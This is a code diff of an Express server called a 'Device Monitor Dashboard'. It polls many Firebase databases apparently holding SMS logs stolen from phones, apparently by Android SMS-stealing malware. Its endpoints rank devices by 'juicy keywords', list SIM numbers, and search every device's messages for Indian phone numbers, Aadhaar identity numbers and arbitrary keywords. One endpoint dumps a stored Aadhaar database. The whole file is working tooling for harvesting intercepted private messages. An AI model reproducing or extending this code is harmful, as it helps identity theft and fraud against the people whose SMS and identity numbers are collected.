+    deviceId,
+    brand:   d.brand || 'Unknown',
+    status:  d.current_status || 'offline',
+    battery: d.last_battery   || 'N/A',
+  })).sort((a, b) => (a.status === 'online' ? -1 : 1) - (b.status === 'online' ? -1 : 1));
+  res.json({ id, total: devices.length, online: devices.filter(d => d.status === 'online').length, devices });
+});
+
+// ── SearchNo: find Indian phone numbers in device SMS ─────────────────────────
+app.get('/api/url/:id/device/:deviceId/searchno', async (req, res) => {
+  const id = parseInt(req.params.id);
+  const deviceId = req.params.deviceId;
+  const target = TARGETS.find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'URL not found' });
+  const db = getTargetDb(target);
+  const dev = db[deviceId];
+  if (!dev) return res.status(404).json({ error: 'Device not found' });
+
+  const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace('?print=pretty', '');
+  try {
+    const smsData = await fbFetch(fetchUrl);
+    const PHONE_RE = /(?<!\d)(?:\+91|91)?([6-9]\d{9})(?!\d)/g;
+    const MISSED_CALL_RE = /missed\s+call(s)?\s+(from|to)/i;
+    const AVAILABLE_RE = /is\s+now\s+available|available\s+to\s+(take|receive|answer)/i;
+    const hits = [];
+    for (const msg of iterMsgs(smsData)) {
+      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
+      if (!body || MISSED_CALL_RE.test(body) || AVAILABLE_RE.test(body)) continue;
+      const phones = [...new Set([...body.matchAll(PHONE_RE)].map(m => m[1]))];
+      if (phones.length) hits.push({ body, phones });
+      if (hits.length >= 100) break;
+    }
+    res.json({ hits, total: hits.length });
+  } catch (e) {
+    res.json({ hits: [], total: 0, error: e.message });
+  }
+});
+
+// ── SearchAadhar: find Aadhaar numbers in device SMS ─────────────────────────
+app.get('/api/url/:id/device/:deviceId/searchaadhar', async (req, res) => {
+  const id = parseInt(req.params.id);
+  const deviceId = req.params.deviceId;
+  const target = TARGETS.find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'URL not found' });
+  const db = getTargetDb(target);
+  const dev = db[deviceId];
+  if (!dev) return res.status(404).json({ error: 'Device not found' });
+
+  const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace('?print=pretty', '');
+  try {
+    const smsData = await fbFetch(fetchUrl);
+    const AADHAR_RE = /(?<!\d)([2-9]\d{11})(?!\d)/g;
+    const AADHAR_KW = /aadhaar|aadhar/i;
+    const hits = [];
+    for (const msg of iterMsgs(smsData)) {
+      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
+      if (!body) continue;
+      const aadhars = [...new Set([...body.matchAll(AADHAR_RE)].map(m => m[1]))];
+      if (aadhars.length && AADHAR_KW.test(body)) hits.push({ body, aadhars, hasKeyword: true });
+      if (hits.length >= 100) break;
+    }
+    res.json({ hits, total: hits.length });
+  } catch (e) {
+    res.json({ hits: [], total: 0, error: e.message });
+  }
+});
+
+// ── SMS Search: search all devices in a URL for keyword ──────────────────────
+app.get('/api/url/:id/sms-search', async (req, res) => {
+  const id = parseInt(req.params.id);
+  const q  = (req.query.q || '').trim().toLowerCase();
+  if (!q) return res.json({ hits: [], total: 0, error: 'No query' });
+  const target = TARGETS.find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'URL not found' });
+
+  const db = getTargetDb(target);
+  const deviceEntries = Object.entries(db);
+  if (!deviceEntries.length) return res.json({ hits: [], total: 0, error: 'No cached devices' });
+
+  const hits = [], errors = [];
+  let stopped = false;
+  for (const [deviceId, dev] of deviceEntries) {
+    if (stopped) break;
+    const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace(/\?.*$/, '');
+    try {
+      const smsData = await fbFetch(fetchUrl);
+      for (const msg of iterMsgs(smsData)) {
+        const body = String(msg.body || msg.message || msg.msg || msg.text || '');
+        if (!body) continue;
+        if (body.toLowerCase().includes(q)) {
+          hits.push({ deviceId, brand: dev.brand || 'Unknown', body });
+          if (hits.length >= 200) { stopped = true; break; }
+        }
+      }
+    } catch (e) {
+      errors.push(`${deviceId}: ${e.message}`);
+    }
+  }
+  res.json({ hits, total: hits.length, errors: errors.slice(0, 10) });
+});
+
+// ── Global device search across all new URLs ──────────────────────────────────
+app.get('/api/search/device/:deviceId', (req, res) => {
+  const q = req.params.deviceId.toLowerCase().trim();
+  const results = [];
+  for (const target of TARGETS) {
+    const db = getTargetDb(target);
+    for (const [deviceId, dev] of Object.entries(db)) {
+      if (deviceId.toLowerCase().includes(q)) {
+        results.push({
+          urlId: target.id, url: target.url, schema: target.schema, deviceId,
+          brand:        dev.brand          || 'Unknown',
+          status:       dev.current_status || 'offline',
+          battery:      dev.last_battery   || 'N/A',
+          sim1:         dev.sim1_number    || 'N/A',
+          sim2:         dev.sim2_number    || 'N/A',
+          lastActivity: dev.last_activity  || null,
+          juicyKeywords: dev.juicy_keywords || [],
+          smsLink:      getSmsLink(target, deviceId, dev.obj_id),
+        });
+      }
+    }
+  }
+  res.json({ results, total: results.length });
+});
+
+// ── Debug: dump aadhar DB for a specific URL ──────────────────────────────────
+app.get('/api/debug/aadhar/:id', (req, res) => {
+  const id  = req.params.id;
+  const adb = loadAadharDb();
+  res.json({
+    file: AADHAR_FILE, exists: fs.existsSync(AADHAR_FILE),
+    urlKeys: Object.keys(adb).slice(0, 10),
+    devicesForUrl: adb[id] || {},
+    count: Object.keys(adb[id] || {}).length,
+  });
+});
+
+// ── SIM Overrides ─────────────────────────────────────────────────────────────
+app.get('/api/sim-overrides/:urlId', (req, res) => {
+  const overrides = loadSimOverrides();
+  res.json(overrides[req.params.urlId] || {});
+});
+
+app.post('/api/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
+  const { urlId, deviceId } = req.params;
+  const { sim1, sim2 } = req.body;
+  const overrides = loadSimOverrides();
+  if (!overrides[urlId]) overrides[urlId] = {};
+  if (!overrides[urlId][deviceId]) overrides[urlId][deviceId] = {};
+  if (sim1 !== undefined) overrides[urlId][deviceId].sim1 = sim1;
+  if (sim2 !== undefined) overrides[urlId][deviceId].sim2 = sim2;
+  if (!overrides[urlId][deviceId].sim1 && !overrides[urlId][deviceId].sim2)
+    delete overrides[urlId][deviceId];
+  saveSimOverrides(overrides);
+  res.json({ ok: true });
 });
 
 app.post('/api/old/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
@@ -371,412 +952,7 @@ app.post('/api/old/sim-overrides/:urlId/:deviceId', express.json(), (req, res) =
   res.json({ ok: true });
 });
 
-app.get('/api/url/:id', (req, res) => {
-  const id = parseInt(req.params.id);
-  const target = TARGETS.find(t => t.id === id);
-  if (!target) return res.status(404).json({ error: 'Not found' });
-
-  const devices = loadDb(id);
-  const aadharDb = loadAadharDb();
-  const aadharForUrl = aadharDb[String(id)] || {};
-  const simOverrides = loadSimOverrides();
-  const simForUrl = simOverrides[String(id)] || {};
-
-  const deviceList = Object.entries(devices)
-    .map(([deviceId, dev]) => ({
-      deviceId,
-      brand:         dev.brand || 'Unknown',
-      status:        dev.current_status || 'offline',
-      battery:       dev.last_battery || 'N/A',
-      lastActivity:  dev.last_activity || null,
-      smsDate:       dev.last_activity || null,
-      lastOnline:    dev.last_online || null,
-      sim1:          dev.sim1_number || 'N/A',
-      sim2:          dev.sim2_number || 'N/A',
-      sim1Clean:     extract10Digits(simForUrl[deviceId]?.sim1 || dev.sim1_number),
-      sim2Clean:     extract10Digits(simForUrl[deviceId]?.sim2 || dev.sim2_number),
-      sim1Override:  simForUrl[deviceId]?.sim1 || '',
-      sim2Override:  simForUrl[deviceId]?.sim2 || '',
-      juicyKeywords: dev.juicy_keywords || [],
-      appId:         dev.app_id || 'N/A',
-      objId:         dev.obj_id || 'N/A',
-      userSerial:    dev.user_serial || 'N/A',
-      sim1Enriched:  dev.sim1_enriched || [],
-      sim2Enriched:  dev.sim2_enriched || [],
-      smsLink:       getSmsLink(target, deviceId, dev.obj_id),
-      hasAadhaar:    !!(aadharForUrl[deviceId] && aadharForUrl[deviceId].length > 0),
-      aadhaarNums:   aadharForUrl[deviceId] || [],
-    }))
-    .sort((a, b) => {
-      // online first, then juicy, then by lastActivity desc
-      if (a.status !== b.status) return a.status === 'online' ? -1 : 1;
-      if (b.juicyKeywords.length !== a.juicyKeywords.length)
-        return b.juicyKeywords.length - a.juicyKeywords.length;
-      return 0;
-    });
-
-  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
-});
-
-// ── SearchNo: fetch device SMS from Firebase, return messages with Indian phone numbers ──
-app.get('/api/url/:id/device/:deviceId/searchno', async (req, res) => {
-  const id = parseInt(req.params.id);
-  const deviceId = req.params.deviceId;
-  const target = TARGETS.find(t => t.id === id);
-  if (!target) return res.status(404).json({ error: 'URL not found' });
-
-  const db = loadDb(id);
-  const dev = db[deviceId];
-  if (!dev) return res.status(404).json({ error: 'Device not found in cache' });
-
-  const objId = dev.obj_id || 'N/A';
-  const fetchUrl = getSmsLink(target, deviceId, objId).replace('?print=pretty', '');
-
-  try {
-    const resp = await fetch(fetchUrl, {
-      headers: { 'User-Agent': 'Mozilla/5.0' },
-      signal: AbortSignal.timeout(15000),
-    });
-    if (!resp.ok) {
-      return res.json({ hits: [], total: 0, error: `HTTP ${resp.status}` });
-    }
-    const smsData = await resp.json();
-
-    // Indian mobile: 10 digits starting 6-9, optionally prefixed with +91 or 91
-    const PHONE_RE = /(?<!\d)(?:\+91|91)?([6-9]\d{9})(?!\d)/g;
-    const MISSED_CALL_RE = /missed\s+call(s)?\s+(from|to)/i;
-    const AVAILABLE_RE = /is\s+now\s+available|available\s+to\s+(take|receive|answer)/i;
-
-    function* iterMsgs(data) {
-      if (typeof data !== 'object' || !data) return;
-      for (const v of Object.values(data)) {
-        if (typeof v !== 'object' || !v) continue;
-        const hasBody = 'body' in v || 'message' in v || 'msg' in v || 'text' in v;
-        if (hasBody) { yield v; }
-        else { yield* iterMsgs(v); }
-      }
-    }
-
-    const hits = [];
-    for (const msg of iterMsgs(smsData)) {
-      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
-      if (!body) continue;
-      if (MISSED_CALL_RE.test(body) || AVAILABLE_RE.test(body)) continue;
-      const phones = [...new Set([...body.matchAll(PHONE_RE)].map(m => m[1]))];
-      if (phones.length) hits.push({ body, phones });
-      if (hits.length >= 100) break; // cap at 100
-    }
-
-    res.json({ hits, total: hits.length });
-  } catch (e) {
-    res.json({ hits: [], total: 0, error: e.message });
-  }
-});
-
-// ── SearchAadhar: fetch device SMS, return messages containing 12-digit Aadhaar numbers ──
-app.get('/api/url/:id/device/:deviceId/searchaadhar', async (req, res) => {
-  const id = parseInt(req.params.id);
-  const deviceId = req.params.deviceId;
-  const target = TARGETS.find(t => t.id === id);
-  if (!target) return res.status(404).json({ error: 'URL not found' });
-
-  const db = loadDb(id);
-  const dev = db[deviceId];
-  if (!dev) return res.status(404).json({ error: 'Device not found in cache' });
-
-  const objId = dev.obj_id || 'N/A';
-  const fetchUrl = getSmsLink(target, deviceId, objId).replace('?print=pretty', '');
-
-  try {
-    const resp = await fetch(fetchUrl, {
-      headers: { 'User-Agent': 'Mozilla/5.0' },
-      signal: AbortSignal.timeout(15000),
-    });
-    if (!resp.ok) return res.json({ hits: [], total: 0, error: `HTTP ${resp.status}` });
-    const smsData = await resp.json();
-
-    // 12-digit Aadhaar: must not be preceded/followed by another digit
-    const AADHAR_RE = /(?<!\d)([2-9]\d{11})(?!\d)/g;
-    const AADHAR_KW = /aadhaar|aadhar/i;
-
-    function* iterMsgs(data) {
-      if (typeof data !== 'object' || !data) return;
-      for (const v of Object.values(data)) {
-        if (typeof v !== 'object' || !v) continue;
-        const hasBody = 'body' in v || 'message' in v || 'msg' in v || 'text' in v;
-        if (hasBody) { yield v; }
-        else { yield* iterMsgs(v); }
-      }
-    }
-
-    const hits = [];
-    for (const msg of iterMsgs(smsData)) {
-      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
-      if (!body) continue;
-      const aadhars = [...new Set([...body.matchAll(AADHAR_RE)].map(m => m[1]))];
-      const hasKeyword = AADHAR_KW.test(body);
-      // Include ONLY if BOTH: has 12-digit number AND contains "aadhaar" keyword
-      if (aadhars.length && hasKeyword) {
-        hits.push({ body, aadhars, hasKeyword });
-      }
-      if (hits.length >= 100) break;
-    }
-
-    res.json({ hits, total: hits.length });
-  } catch (e) {
-    res.json({ hits: [], total: 0, error: e.message });
-  }
-});
-
-// ── Live fetch: get devices directly from Firebase (bypasses cached DB) ───────
-app.get('/api/url/:id/live', async (req, res) => {
-  const id = parseInt(req.params.id);
-  const target = TARGETS.find(t => t.id === id);
-  if (!target) return res.status(404).json({ error: 'Not found' });
-
-  const { url, schema } = target;
-
-  // Determine main endpoint per schema (mirrors DA1.py logic)
-  let mainEndpoint;
-  if (schema === 1)                           mainEndpoint = `${url}/All_Users.json`;
-  else if (schema === 2 || schema === 4)      mainEndpoint = `${url}/clients.json`;
-  else if (schema === 3)                      mainEndpoint = `${url}/user_data.json`;
-  else if (schema === 5)                      mainEndpoint = `${url}/devices.json`;
-  else if (schema === 6)                      mainEndpoint = `${url}/data.json`;
-  else if (schema === '8a')                   mainEndpoint = `${url}/omex.json`;
-  else if (['8b',9,10,11,14,15].includes(schema)) mainEndpoint = `${url}/.json`;
-  else if (schema === 12)                     mainEndpoint = `${url}/devices.json`;
-  else if (schema === 13)                     mainEndpoint = `${url}/admin.json`;
-  else                                        mainEndpoint = `${url}/All_Users.json`;
-
-  try {
-    const resp = await fetch(mainEndpoint, {
-      headers: { 'User-Agent': 'Mozilla/5.0' },
-      signal: AbortSignal.timeout(20000),
-    });
-    if (!resp.ok) return res.json({ error: `Firebase HTTP ${resp.status}`, devices: [] });
-    const data = await resp.json();
-
-    // Extract device list per schema
-    let rawDevs = {};
-    if (schema === 1) {
-      rawDevs = (data?.Data?.DeviceInfo) || {};
-    } else if (schema === '8a') {
-      rawDevs = data?.All_User?.Info || {};
-    } else if (schema === '8b') {
-      rawDevs = data?.omex?.All_User?.Info || {};
-    } else if (schema === 9) {
-      rawDevs = data?.user_data || {};
-    } else if (schema === 10 || schema === 11) {
-      rawDevs = data?.clients || {};
-    } else if (schema === 12) {
-      rawDevs = data || {};
-    } else if (schema === 13) {
-      // flatten admin[X].users
-      if (data && typeof data === 'object') {
-        for (const av of Object.values(data)) {
-          if (av && typeof av === 'object' && av.users) {
-            for (const [uid, udat] of Object.entries(av.users)) {
-              if (udat && typeof udat === 'object') rawDevs[uid] = udat;
-            }
-          }
-        }
-      }
-    } else if (schema === 14) {
-      const ud = data?.user_data || {};
-      const cl = data?.clients || {};
-      for (const [k,v] of Object.entries(ud)) if (v && typeof v==='object') rawDevs[k] = v;
-      for (const [k,v] of Object.entries(cl)) if (!rawDevs[k] && v && typeof v==='object') rawDevs[k] = v;
-    } else if (schema === 15) {
-      const users = data?.users || {};
-      for (const [,udat] of Object.entries(users)) {
-        if (udat?.DeviceId) rawDevs[udat.DeviceId] = udat;
-      }
-    } else {
-      rawDevs = (data && typeof data === 'object') ? data : {};
-    }
-
-    // Build simplified device list from live data
-    const now = Date.now();
-    const devices = Object.entries(rawDevs)
-      .filter(([, d]) => d && typeof d === 'object')
-      .map(([deviceId, d]) => {
-        // Determine online status
-        let isOnline = false;
-        if (schema === 1)       isOnline = d.Status === 'Online';
-        else if (schema === '8a' || schema === '8b') isOnline = d.status === 'Online';
-        else if (schema === 9)  isOnline = d.status === 'online';
-        else if (schema === 15) isOnline = d.Status === 'Online';
-        else                    isOnline = d.status === true || d.status === 'online' || d.status === 'Online';
-
-        // Brand
-        let brand = d.Brand || d.Name || d.brand || d.modelName || d.d_name || d.DeviceId || 'Unknown';
-
-        // Battery
-        let battery = d.Battery || d.battery || 'N/A';
-
-        return { deviceId, brand: String(brand), status: isOnline ? 'online' : 'offline', battery: String(battery) };
-      })
-      .sort((a, b) => (a.status === 'online' ? -1 : 1) - (b.status === 'online' ? -1 : 1));
-
-    res.json({ id, total: devices.length, online: devices.filter(d=>d.status==='online').length, devices });
-  } catch (e) {
-    res.json({ error: e.message, devices: [] });
-  }
-});
-
-// ── SMS Search: search all devices in a URL for a keyword/phrase ──────────────
-app.get('/api/url/:id/sms-search', async (req, res) => {
-  const id = parseInt(req.params.id);
-  const q  = (req.query.q || '').trim().toLowerCase();
-  if (!q) return res.json({ hits: [], total: 0, error: 'No query' });
-
-  const target = TARGETS.find(t => t.id === id);
-  if (!target) return res.status(404).json({ error: 'URL not found' });
-
-  const db = loadDb(id);
-  const deviceEntries = Object.entries(db);
-  if (!deviceEntries.length) return res.json({ hits: [], total: 0, error: 'No cached devices' });
-
-  function* iterMsgs(data) {
-    if (typeof data !== 'object' || !data) return;
-    for (const v of Object.values(data)) {
-      if (typeof v !== 'object' || !v) continue;
-      const hasBody = 'body' in v || 'message' in v || 'msg' in v || 'text' in v;
-      if (hasBody) yield v;
-      else yield* iterMsgs(v);
-    }
-  }
-
-  const hits = [];
-  const errors = [];
-  let stopped = false;
-
-  // Process devices sequentially to avoid hitting Firebase rate limits
-  for (const [deviceId, dev] of deviceEntries) {
-    if (stopped) break;
-    const objId    = dev.obj_id || 'N/A';
-    const rawLink  = getSmsLink(target, deviceId, objId);
-    const fetchUrl = rawLink.replace(/\?.*$/, ''); // strip any query params
-    try {
-      const resp = await fetch(fetchUrl, {
-        headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json' },
-        signal: AbortSignal.timeout(10000),
-      });
-      if (!resp.ok) continue;
-      const ct = resp.headers.get('content-type') || '';
-      if (!ct.includes('application/json') && !ct.includes('text/plain')) continue;
-      const text = await resp.text();
-      if (!text || text[0] === '<') continue; // HTML response (auth error page)
-      let smsData;
-      try { smsData = JSON.parse(text); } catch { continue; }
-      if (!smsData) continue;
-      for (const msg of iterMsgs(smsData)) {
-        const body = String(msg.body || msg.message || msg.msg || msg.text || '');
-        if (!body) continue;
-        if (body.toLowerCase().includes(q)) {
-          hits.push({ deviceId, brand: dev.brand || 'Unknown', body });
-          if (hits.length >= 200) { stopped = true; break; }
-        }
-      }
-    } catch (e) {
-      errors.push(`${deviceId}: ${e.message}`);
-    }
-  }
-
-  res.json({ hits, total: hits.length, errors: errors.slice(0, 10) });
-});
-
-// ── Debug: dump aadhar DB for a specific URL ─────────────────────────────────
-app.get('/api/debug/aadhar/:id', (req, res) => {
-  const id = req.params.id;
-  const aadharDb = loadAadharDb();
-  const forUrl = aadharDb[id] || {};
-  res.json({
-    file: AADHAR_FILE,
-    exists: fs.existsSync(AADHAR_FILE),
-    urlKeys: Object.keys(aadharDb).slice(0,10),
-    devicesForUrl: forUrl,
-    count: Object.keys(forUrl).length,
-  });
-});
-
-// ── Global device search across all URLs ─────────────────────────────────────
-app.get('/api/search/device/:deviceId', (req, res) => {
-  const q = req.params.deviceId.toLowerCase().trim();
-  const results = [];
-  for (const target of TARGETS) {
-    const db = loadDb(target.id);
-    for (const [deviceId, dev] of Object.entries(db)) {
-      if (deviceId.toLowerCase().includes(q)) {
-        results.push({
-          urlId:      target.id,
-          url:        target.url,
-          schema:     target.schema,
-          deviceId,
-          brand:      dev.brand || 'Unknown',
-          status:     dev.current_status || 'offline',
-          battery:    dev.last_battery || 'N/A',
-          sim1:       dev.sim1_number || 'N/A',
-          sim2:       dev.sim2_number || 'N/A',
-          lastActivity: dev.last_activity || null,
-          juicyKeywords: dev.juicy_keywords || [],
-          smsLink:    getSmsLink(target, deviceId, dev.obj_id),
-        });
-      }
-    }
-  }
-  res.json({ results, total: results.length });
-});
-
-// ── SIM Overrides: save manually entered SIM numbers per device ───────────────
-const SIM_FILE = path.join(BOT_DIR, 'sim_overrides.json');
-
-function loadSimOverrides() {
-  try { if (fs.existsSync(SIM_FILE)) return JSON.parse(fs.readFileSync(SIM_FILE, 'utf8')); }
-  catch {}
-  return {};
-}
-function saveSimOverrides(data) {
-  try { fs.writeFileSync(SIM_FILE, JSON.stringify(data, null, 2)); }
-  catch (e) { console.error('SIM overrides save error:', e.message); }
-}
-
-// GET: return saved sim overrides for a URL
-app.get('/api/sim-overrides/:urlId', (req, res) => {
-  const overrides = loadSimOverrides();
-  res.json(overrides[req.params.urlId] || {});
-});
-
-// POST: save sim1/sim2 override for a device
-app.post('/api/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
-  const { urlId, deviceId } = req.params;
-  const { sim1, sim2 } = req.body;
-  const overrides = loadSimOverrides();
-  if (!overrides[urlId]) overrides[urlId] = {};
-  if (!overrides[urlId][deviceId]) overrides[urlId][deviceId] = {};
-  if (sim1 !== undefined) overrides[urlId][deviceId].sim1 = sim1;
-  if (sim2 !== undefined) overrides[urlId][deviceId].sim2 = sim2;
-  // Clean up empty entries
-  if (!overrides[urlId][deviceId].sim1 && !overrides[urlId][deviceId].sim2)
-    delete overrides[urlId][deviceId];
-  saveSimOverrides(overrides);
-  res.json({ ok: true });
-});
-
-// ── Device Notes: save/load text notes per device (stored in notes.json) ──────
-const NOTES_FILE = path.join(BOT_DIR, 'device_notes.json');
-
-function loadNotes() {
-  try { if (fs.existsSync(NOTES_FILE)) return JSON.parse(fs.readFileSync(NOTES_FILE, 'utf8')); }
-  catch {}
-  return {};
-}
-function saveNotes(notes) {
-  try { fs.writeFileSync(NOTES_FILE, JSON.stringify(notes, null, 2)); }
-  catch (e) { console.error('Notes save error:', e.message); }
-}
-
+// ── Device Notes ──────────────────────────────────────────────────────────────
 app.get('/api/notes/:urlId/:deviceId', (req, res) => {
   const key = `${req.params.urlId}:${req.params.deviceId}`;
   const notes = loadNotes();
@@ -787,7 +963,7 @@ app.post('/api/notes/:urlId/:deviceId', express.json(), (req, res) => {
   const key = `${req.params.urlId}:${req.params.deviceId}`;
   const notes = loadNotes();
   notes[key] = req.body.note || '';
-  saveNotes(notes);
+  saveNotesFile(notes);
   res.json({ ok: true });
 });
 
@@ -795,7 +971,11 @@ app.post('/api/notes/:urlId/:deviceId', express.json(), (req, res) => {
 app.use(express.static(path.join(__dirname, 'public')));
 app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
+// ── Boot ──────────────────────────────────────────────────────────────────────
+loadDashboardDb();
 app.listen(PORT, () => {
   console.log(`Device Monitor Dashboard running at http://localhost:${PORT}`);
-  console.log(`Reading DB files from: ${BOT_DIR}`);
+  console.log(`Dashboard DB: ${DB_FILE}`);
+  runPoller(); // start background polling
 });
+
